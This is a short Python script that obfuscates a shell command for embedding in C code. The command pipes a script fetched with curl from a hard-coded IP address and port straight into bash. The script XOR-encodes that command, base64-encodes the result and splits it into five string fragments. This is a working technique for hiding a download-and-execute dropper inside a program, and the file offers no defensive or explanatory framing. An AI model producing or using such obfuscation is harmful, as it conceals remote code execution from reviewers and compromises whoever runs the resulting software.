#!/usr/bin/env python3
import base64

payload = b'curl http://20.74.81.63:2982/test.sh -s| bash'
key = 0x87

# XOR each byte
xored = bytes([b ^ key for b in payload])

# Base64 encode the XORed bytes
b64 = base64.b64encode(xored).decode()

# Split into 5 parts (arbitrary lengths)
part_len = (len(b64) + 4) // 5
parts = [b64[i:i+part_len] for i in range(0, len(b64), part_len)]

# Print parts for C code
for i, p in enumerate(parts, 1):
    print(f'part{i} = "{p}";')

